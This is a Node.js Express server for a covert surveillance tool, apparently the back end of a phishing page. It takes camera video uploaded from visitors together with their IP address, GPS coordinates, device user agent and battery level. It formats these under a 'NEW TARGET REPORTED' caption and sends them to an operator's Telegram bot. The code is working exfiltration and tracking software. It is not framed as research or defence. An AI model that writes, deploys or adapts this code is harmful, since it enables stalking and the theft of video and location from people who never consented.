import express from "express";
import multer from "multer";
import fetch from "node-fetch";
import FormData from "form-data";

const app = express();
const upload = multer({ storage: multer.memoryStorage() });

// ===== CONFIGURATION CONFIG =====
const PORT = 3000;
const BOT_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN_HERE";
const CHAT_ID = "YOUR_TELEGRAM_CHAT_ID_HERE";

// Build clean Telegram text markdown
function buildCaption(info) {
    const mapLink = info.latitude && info.longitude
        ? `https://www.google.com/maps?q=${info.latitude},${info.longitude}`
        : "Location not available";

    return `🎬 *NEW TARGET REPORTED*

🌐 *IP Address:* \`${info.ip || "Unknown"}\`

📍 *Location Coordinates:*
${mapLink}

💻 *Device UserAgent:*
\`${info.userAgent || "Unknown"}\`

🔋 *Battery Level:* \`${info.battery || "Unknown"}\``;
}

// Upload endpoint
app.post("/upload-video", upload.single("video"), async (req, res) => {
    try {
        const videoFile = req.file;
        if (!videoFile) {
            return res.status(400).json({ error: "No video file provided" });
        }

        const { ip, latitude, longitude, userAgent, battery } = req.body;

        const captionText = buildCaption({
            ip,
            latitude,
            longitude,
            userAgent,
            battery
        });

        // Initialize multi-part form data for Telegram API
        const form = new FormData();
        form.append("chat_id", CHAT_ID);
        form.append("caption", captionText);
        form.append("parse_mode", "Markdown");
        
        // Append video stream directly out of system RAM buffer
        form.append("video", videoFile.buffer, {
            filename: "video.mp4",
            contentType: videoFile.mimetype
        });

        // Dispatch payload to Telegram API sendVideo endpoint
        const telegramResponse = await fetch(
            `https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`,
            {
                method: "POST",
                body: form,
                headers: form.getHeaders()
            }
        );

        const result = await telegramResponse.json();

        if (!result.ok) {
            console.error("Telegram API Error Response:", result);
            return res.status(502).json({ error: "Telegram API bad gateway execution", details: result });
        }

        console.log("Telegram transmission success:", result.result.message_id);
        res.json({ success: true, messageId: result.result.message_id });

    } catch (error) {
        console.error("Processing breakdown error:", error);
        res.status(500).json({
            error: "Server internal error",
            message: error.message
        });
    }
});

// Serve frontend assets
app.use(express.static("frontend"));

app.listen(PORT, () => {
    console.log(`Server executing active processes on port ${PORT}`);
});
